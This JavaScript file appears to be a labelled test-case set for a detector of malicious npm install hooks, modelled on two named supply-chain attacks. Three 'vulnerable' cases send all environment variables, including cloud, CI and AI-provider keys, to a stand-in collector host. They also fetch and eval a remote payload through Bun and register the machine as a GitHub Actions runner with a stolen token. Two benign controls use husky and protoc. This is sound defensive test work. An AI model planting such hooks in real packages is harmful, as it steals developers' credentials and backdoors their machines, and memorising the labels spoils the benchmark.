/**
 * Supply Chain Expansion Test Cases (JavaScript)
 * New patterns from Shai-Hulud v2 (Nov 2025) and S1ngularity/Nx (Aug 2025).
 *
 * Shai-Hulud v2: 796 packages, 25K malicious GitHub repos. Used Bun instead
 * of Node.js as runtime evasion. Registered victims as GitHub Actions
 * self-hosted runners for persistent backdoor.
 *
 * S1ngularity/Nx: Stole npm publish tokens via GitHub Actions injection.
 * First supply chain attack to specifically target AI CLI tools (Claude,
 * Gemini, AWS Q) for credential harvesting.
 *
 * References:
 *   https://unit42.paloaltonetworks.com/npm-supply-chain-attack/
 *   https://www.wiz.io/blog/s1ngularity-supply-chain-attack
 */


// ============================================================================
// VULNERABLE: preinstall script exfiltrates environment variables
// S1ngularity/Nx pattern (Aug 2025) -- first to target AI CLI credentials
// ============================================================================

// vuln-code-snippet start preinstall_env_exfil
// package.json "preinstall" script equivalent:
// "preinstall": "node -e \"require('https').request({hostname:'collector.example.com',method:'POST',path:'/e'},r=>r.resume()).end(JSON.stringify(process.env))\""
//
// This simulates the preinstall hook behavior in JavaScript:
function preinstallHook() {
    const https = require('https');
    // Exfiltrate all environment variables including:
    // - GITHUB_TOKEN, NPM_TOKEN (CI/CD credentials)
    // - ANTHROPIC_API_KEY, OPENAI_API_KEY (AI tool credentials)
    // - AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY
    const envData = JSON.stringify(process.env);
    const req = https.request({
        hostname: 'collector.example.com',
        method: 'POST',
        path: '/env',
        headers: { 'Content-Type': 'application/json' },
    }, (res) => res.resume());
    req.end(envData);  // vuln-code-snippet vuln-line preinstall_env_exfil
}
module.exports = { preinstallHook };
// vuln-code-snippet end preinstall_env_exfil


// ============================================================================
// VULNERABLE: postinstall uses Bun instead of Node to evade security tooling
// Shai-Hulud v2 pattern (Nov 2025) -- Bun as evasion runtime
// ============================================================================

// vuln-code-snippet start bun_runtime_evasion
// package.json: "postinstall": "bun run setup.js"
// Security tools optimized for Node.js miss Bun-specific execution.
// The setup.js itself looks innocent but downloads and executes a payload.
function postinstallBunSetup() {
    const { execSync } = require('child_process');
    // Shai-Hulud v2 used Bun because:
    // 1. npm audit doesn't inspect Bun-specific APIs
    // 2. Socket.dev's static analysis targets Node.js require() patterns
    // 3. Bun's native fetch and file APIs bypass Node.js hook interception
    execSync('bun run -e "const r=await fetch(\'https://cdn.example.com/s\');eval(await r.text())"');  // vuln-code-snippet vuln-line bun_runtime_evasion
}
module.exports.setup = postinstallBunSetup;
// vuln-code-snippet end bun_runtime_evasion


// ============================================================================
// VULNERABLE: Install hook registers machine as GitHub Actions self-hosted runner
// Shai-Hulud v2 persistence mechanism (Nov 2025)
// ============================================================================

// vuln-code-snippet start self_hosted_runner_reg
function registerRunner() {
    const { execSync } = require('child_process');
    const os = require('os');
    // Shai-Hulud v2 registered compromised developer machines as
    // GitHub Actions self-hosted runners, giving the attacker:
    // 1. Persistent code execution on the victim's machine
    // 2. Access to all repos the victim's GitHub token can reach
    // 3. Ability to inject into CI/CD pipelines
    const token = process.env.GITHUB_TOKEN || '';
    const runnerName = `runner-${os.hostname()}-${Date.now()}`;
    execSync(`curl -sL https://github.com/actions/runner/releases/download/v2.311.0/actions-runner-linux-x64-2.311.0.tar.gz | tar xz && ./config.sh --url https://github.com/org/repo --token ${token} --name ${runnerName} --unattended`);  // vuln-code-snippet vuln-line self_hosted_runner_reg
}
module.exports.register = registerRunner;
// vuln-code-snippet end self_hosted_runner_reg


// ============================================================================
// SAFE: postinstall runs Husky git hooks setup (legitimate)
// ============================================================================

// vuln-code-snippet start postinstall_husky_setup
// package.json: "postinstall": "husky install"
// Husky is a widely-used git hooks manager with 30M+ weekly downloads.
function setupGitHooks() {
    const { execSync } = require('child_process');
    // Standard Husky setup: creates .husky/ directory with git hook scripts.
    // This is a legitimate development tool used by thousands of projects
    // including React, Vue, Angular, and Next.js.
    execSync('npx husky install');  // vuln-code-snippet safe-line postinstall_husky_setup
}
module.exports = { setupGitHooks };
// vuln-code-snippet end postinstall_husky_setup


// ============================================================================
// SAFE: preinstall runs protobuf code generation (legitimate build step)
// ============================================================================

// vuln-code-snippet start preinstall_protobuf_gen
// package.json: "preinstall": "npx protoc --js_out=./src/proto ./proto/*.proto"
function generateProtoTypes() {
    const { execSync } = require('child_process');
    // Standard protobuf code generation. Compiles .proto definition files
    // into JavaScript source files. This is a build step, not an attack.
    // The protoc compiler is deterministic and only reads .proto files.
    execSync('npx protoc --js_out=import_style=commonjs,binary:./src/proto ./proto/*.proto');  // vuln-code-snippet safe-line preinstall_protobuf_gen
}
module.exports = { generateProtoTypes };
// vuln-code-snippet end preinstall_protobuf_gen
